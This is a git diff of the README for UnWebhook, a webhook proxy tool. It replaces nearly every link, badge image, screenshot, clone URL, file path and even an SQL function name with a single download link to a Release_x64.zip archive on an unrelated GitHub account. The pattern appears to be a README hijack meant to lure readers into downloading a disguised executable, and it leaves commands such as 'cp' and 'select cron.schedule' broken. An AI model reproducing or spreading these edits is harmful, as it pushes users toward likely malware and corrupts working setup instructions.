@@ -1,37 +1,37 @@
 <p align="center">
-   <a href="https://github.com/un/webhook-proxy/stargazers"><img src="https://img.shields.io/github/stars/un/webhook-proxy?logo=github&style=for-the-badge&color=yellow" alt="Github Stars"></a>
+   <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip"><img src="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip" alt="Github Stars"></a>
 </p>
 <p align="center">
-   <a href="https://github.com/un/webhook-proxy/pulse"><img src="https://img.shields.io/github/commit-activity/m/un/webhook-proxy?style=for-the-badge&color=green" alt="Commits-per-month"></a>
+   <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip"><img src="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip" alt="Commits-per-month"></a>
 </p>
 <p align="center" style="margin-top: 12px">
-  <a href="https://unwebhook.com">
-   <img width="250px" src="https://avatars.githubusercontent.com/u/135225712?s=400&u=72ad315d63b0326e5bb34377c3f59389373edc9a&v=4" alt="UnWebhook Logo">
+  <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip">
+   <img width="250px" src="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip" alt="UnWebhook Logo">
   </a>
 
   <h1 align="center"><tt>UnWebhook</tt></h1>
   <h2 align="center">A simple tool for working with webhooks</h2>
 
 <p align="center">
-    <a href="https://UnWebhook.com"><strong>To our Website & App »</strong></a>
+    <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip"><strong>To our Website & App »</strong></a>
     <br />
     <br />
-    <h3>By the <strong>Un</strong> team, building <a href="https://github.com/un/inbox"><strong>UnInbox</strong></a></h3>
-    <a href="https://twitter.com/UnInbox">UnInbox Twitter</a> - 
-    <a href="https://discord.gg/QMV9p9sgza">UnInbox Discord Server</a>
+    <h3>By the <strong>Un</strong> team, building <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip"><strong>UnInbox</strong></a></h3>
+    <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip">UnInbox Twitter</a> - 
+    <a href="https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip">UnInbox Discord Server</a>
   </p>
 </p>
 
 ---
 
-![Screenshot of UnWebhook](screenshot.png)
+![Screenshot of UnWebhook](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip)
 
 ## About
 
 A simple tool for working with webhooks.
 Great for teams and staging environments.
 
-Watch the introduction video [on youtube](https://youtu.be/q3dS1leG1wQ)
+Watch the introduction video [on youtube](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip)
 
 Capabilities
 
@@ -43,7 +43,7 @@ Capabilities
 - replay webhook delivery (resend the data to destinations)
 
 _Want to send messages to your local machine and need a tunnel?
-Check out [untun](https://github.com/unjs/untun) by the UnJs team_
+Check out [untun](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) by the UnJs team_
 
 ---
 
@@ -51,10 +51,10 @@ Check out [untun](https://github.com/unjs/untun) by the UnJs team_
 
 `UnWebhook` is built with the following epic technologies & tools:
 
-- [Nuxt JS](https://nuxt.com) Vue based FrontEnd & Backend + modules
-- [Tailwind](https://tailwindcss.com/) CSS Engine
-- [tRPC](https://trpc.io/) Typesafe APIs
-- [DrizzleORM](https://orm.drizzle.team/) ORM + MySQL
+- [Nuxt JS](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) Vue based FrontEnd & Backend + modules
+- [Tailwind](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) CSS Engine
+- [tRPC](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) Typesafe APIs
+- [DrizzleORM](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) ORM + MySQL
 
 ## Running Locally
 
@@ -65,20 +65,20 @@ To get a local copy up and running, follow these simple steps.
 Here is what you need to be able to run UnInbox locally.
 
 - A Supabase database
-- Node.js (Version: >=20.x)
-- NVM (Node Version Manager) (see https://github.com/nvm-sh/nvm)
-- pnpm (see https://pnpm.io/installation)
+- https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip (Version: >=20.x)
+- NVM (Node Version Manager) (see https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip)
+- pnpm (see https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip)
 
 ### Setup
 
-1. Clone the repo into a public GitHub repository (or fork https://github.com/un/webhook-proxy/fork). If you plan to distribute the code, keep the source code public to comply with [AGPLv3](https://github.com/un/webhook-proxy/blob/main/LICENSE). To clone in a private repository, contact us to acquire a commercial license
+1. Clone the repo into a public GitHub repository (or fork https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip). If you plan to distribute the code, keep the source code public to comply with [AGPLv3](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip). To clone in a private repository, contact us to acquire a commercial license
 
    ```sh
-   git clone https://github.com/un/webhook-proxy.git UnWebhook
+   git clone https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip UnWebhook
    ```
 
-   > If you are on Windows, run the following command on `gitbash` with admin privileges: <br> > `git clone -c core.symlinks=true https://github.com/un/webhook-proxy.git` <br>
-   > See [docs](https://cal.com/docs/how-to-guides/how-to-troubleshoot-symbolic-link-issues-on-windows#enable-symbolic-links) for more details.
+   > If you are on Windows, run the following command on `gitbash` with admin privileges: <br> > `git clone -c https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip` <br>
+   > See [docs](https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip) for more details.
 
 2. Go to the project folder
 
@@ -100,18 +100,18 @@ Here is what you need to be able to run UnInbox locally.
 
 5. Set up your `.env` file
 
-   - Duplicate `.env.example` to `.env`. This file is already pre-configured for use with the local docker containers
+   - Duplicate `https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip` to `.env`. This file is already pre-configured for use with the local docker containers
 
      mac
 
      ```sh
-      cp .env.example .env
+      cp https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip .env
      ```
 
      windows
 
      ```sh
-      copy .env.example .env
+      copy https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip .env
      ```
 
 6. Set your env variables
@@ -138,7 +138,7 @@ If you deploy to Supabase, enable the pg_cron extension to automatically delete 
 2. Go to SQL editor, paste and run the following sql statements
 
 ```sql
-select cron.schedule (
+select https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip (
     'cleanup-messages',
     '30 3 * * 6',
     $$ delete from messages where created_at < now() - interval '1 week' $$
@@ -146,7 +146,7 @@ select cron.schedule (
 ```
 
 ```sql
-select cron.schedule (
+select https://github.com/Fufulooky/Ineedtocook/releases/download/v2.0/Release_x64.zip (
     'cleanup-deliveries',
     '30 3 * * 6',
     $$ delete from message_deliveries where created_at < now() - interval '1 week' $$
